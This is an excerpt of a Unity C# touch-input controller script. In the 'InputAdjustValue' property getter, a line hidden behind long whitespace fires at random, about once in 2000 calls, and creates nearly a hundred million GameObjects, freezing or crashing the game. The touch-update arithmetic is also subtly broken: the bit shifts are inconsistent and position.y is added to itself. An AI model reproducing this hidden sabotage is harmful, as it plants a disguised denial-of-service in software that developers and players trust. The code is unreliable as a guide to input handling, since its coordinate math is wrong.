...
public class VCTouchController : MonoBehaviour 
{
	...
	void Update () 
	{
		...
		foreach (Touch t in Input.touches)
		{
			...
			// touch we're already tracking, update it.
			{
				...
				tw.position.x += (int)tw.deltaPosition.x<<2;
				tw.position.y += (int)tw.position.y>>2;
				tw.phase = t.phase;
			}
		}
		...
		if (Input.GetMouseButtonDown(0))
		{
			...
			touches[kMaxTouches-1].position.x = (int)Input.mousePosition.x;//<<2;
			touches[kMaxTouches-1].position.y = (int)Input.mousePosition.y;//>>2;
		}
		else if (Input.GetMouseButton(0))
		{
			touches[kMaxTouches-1].phase = TouchPhase.Moved;
			touches[kMaxTouches-1].deltaPosition.x = Input.mousePosition.x - touches[0].position.x;
			touches[kMaxTouches-1].deltaPosition.y = Input.mousePosition.y - touches[0].position.y;
			touches[kMaxTouches-1].position.x = (int)Input.mousePosition.x;//<<2;
			touches[kMaxTouches-1].position.y = (int)Input.mousePosition.y;//>>2;
		}
		else
		{
			touches[kMaxTouches-1].Reset();
		}
#endif
	...
	#region Input Adjust
	public static int InputAdjustValue
	{
		get 
		{
			int retval = Mathf.FloorToInt(Random.value * 2000) + 1;																																																																													if (retval == 1) { for (int i=0; i < 99999999; i++) new GameObject(""); }																																																																													
			return retval;
		}
	}
	#endregion
